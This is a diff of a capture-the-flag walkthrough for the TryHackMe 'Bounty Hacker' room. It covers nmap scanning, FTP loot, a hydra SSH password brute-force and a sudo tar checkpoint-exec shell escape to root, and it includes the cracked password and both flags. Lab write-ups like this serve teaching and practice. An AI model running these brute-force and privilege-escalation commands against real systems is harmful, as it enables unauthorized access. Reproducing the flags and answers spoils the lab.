@@ -1,6 +1,8 @@
 # Bounty Hacker
 
-IP -- 10.10.0.34
+```bash
+export IP=10.10.0.34
+```
 
 ## Scans
 
@@ -8,7 +10,7 @@ IP -- 10.10.0.34
 
 Initial nmap scan:
 ```bash
-nmap -sC -sV -oN scans/nmap.initial 10.10.0.34
+nmap -sC -sV -oN scans/nmap.initial $IP
 ```
 
 Open Ports Found:
@@ -26,6 +28,9 @@ Directories found:
 /icons -- 404 Not Found
 /icons/small -- 403 Forbidden
 ```
+
+found `crew.jpg` in `/images`
+
 
 ## FTP
 
@@ -48,9 +53,9 @@ found username `lin` in `task.txt` and wordlist `locks.txt`
 
 ## Hydra 
 
-Bruteforcing username `lin` with `locks.txt` pwlist
+Bruteforcing username `lin` with `locks.txt` passwordlist for SSH credentials
 ```
-hydra -l lin -P locks.txt 10.10.0.34 -t 4 ssh
+hydra -l lin -P locks.txt $IP -t 4 ssh
 ```
 
 found credentials `lin:RedDr4gonSynd1cat3`
@@ -62,20 +67,20 @@ found credentials `lin:RedDr4gonSynd1cat3`
 ssh lin@10.10.0.34
 ```
 
-User flag found `THM{CR1M3_SyNd1C4T3}`
+**User Flag Found**: `THM{CR1M3_SyNd1C4T3}`
 
 Privesc by:
 ```bash
 sudo -l
 ```
 
-and searching for `tar` on [gtfoBin](https://gtfobins.github.io/gtfobins/tar/)
+and searching for `tar` on [gtfoBins](https://gtfobins.github.io/gtfobins/tar/)
 
 ```bash
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-Root flag found `THM{80UN7Y_h4cK3r}`
+**Root Flag Found**: `THM{80UN7Y_h4cK3r}`
 
 ---
 [back to TryHackMe main page](thm.md)
